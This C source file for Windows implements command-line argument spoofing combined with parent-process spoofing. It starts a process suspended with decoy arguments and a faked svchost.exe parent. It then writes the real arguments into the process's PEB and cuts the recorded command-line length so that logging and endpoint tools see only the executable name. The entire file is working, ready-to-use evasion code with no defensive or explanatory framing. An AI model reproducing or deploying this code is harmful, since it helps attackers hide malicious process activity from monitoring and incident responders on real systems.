#include <stdio.h>
#include <windows.h>

#include "Common.h"
#include "Structs.h"

BOOL ArgumentSpoofing(IN LPCSTR lpProcessName, IN LPCSTR lpFakeArgs, IN LPCSTR lpRealArgs)
{
	PVOID pPebAddress;
	PPEB pPeb = NULL;
	PRTL_USER_PROCESS_PARAMETERS pParms = NULL;
	SIZE_T sParmsSize, sRealProcess, sNewLength;
	HANDLE hProcess, hThread;
	CHAR lpEnv[MAX_PATH], AbsoluteProcessName[MAX_PATH*2], FakeProcess[MAX_PATH * 4], RealProcess[MAX_PATH * 4];
	WCHAR szRealProcess[MAX_PATH * 4];
	DWORD dwNewLength;

	if (PathIsRelativeA(lpProcessName))
	{
		ExpandEnvironmentStringsA("%windir%", lpEnv, MAX_PATH);
		sprintf_s(AbsoluteProcessName, MAX_PATH * 2, "%s\\System32\\%s", lpEnv, lpProcessName);
		lpProcessName = AbsoluteProcessName;
	}

	strncpy_s(FakeProcess, MAX_PATH*4, lpProcessName, strlen(lpProcessName));
	strcat_s(FakeProcess, MAX_PATH*4, " ");
	strncat_s(FakeProcess, MAX_PATH*4, lpFakeArgs, strlen(lpFakeArgs));

	if (!CreatePPIDSpoofedProcess(CREATE_SUSPENDED, FakeProcess, "svchost.exe", &hProcess, &hThread))
		return FALSE;

	if (!RetrievePEB(hProcess, &pPebAddress, &pPeb))
		return FALSE;

	pParms = (PRTL_USER_PROCESS_PARAMETERS)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF);
	if (!ReadProcessMemory(hProcess, pPeb->ProcessParameters, pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF, &sParmsSize))
		return ReportErrorWinAPI("ReadProcessMemory 2");

	strncpy_s(RealProcess, MAX_PATH * 4, lpProcessName, strlen(lpProcessName));
	strcat_s(RealProcess, MAX_PATH * 4, " ");
	strncat_s(RealProcess, MAX_PATH * 4, lpRealArgs, strlen(lpRealArgs));

	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, RealProcess, -1, szRealProcess, MAX_PATH * 4);

	if (!WriteProcessMemory(hProcess, pParms->CommandLine.Buffer, szRealProcess, lstrlenW(szRealProcess) * sizeof(WCHAR) + 2, &sRealProcess))
		return ReportErrorWinAPI("WriteProcessMemory 1");
	printf("[i] Spoofed the process arguments to '%s'\n", lpRealArgs);

	dwNewLength = strlen(lpProcessName) * 2; // Multipled by 2 due to Unicode
	if (!WriteProcessMemory(hProcess, (PVOID)((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&dwNewLength, sizeof(DWORD), &sNewLength))
		return ReportErrorWinAPI("WriteProcessMemory 2");
	printf("[i] Spoofed the process arguments length to %d\n", dwNewLength);

	HeapFree(GetProcessHeap(), NULL, pPeb);
	HeapFree(GetProcessHeap(), NULL, pParms);

	ResumeThread(hThread);

	return TRUE;
}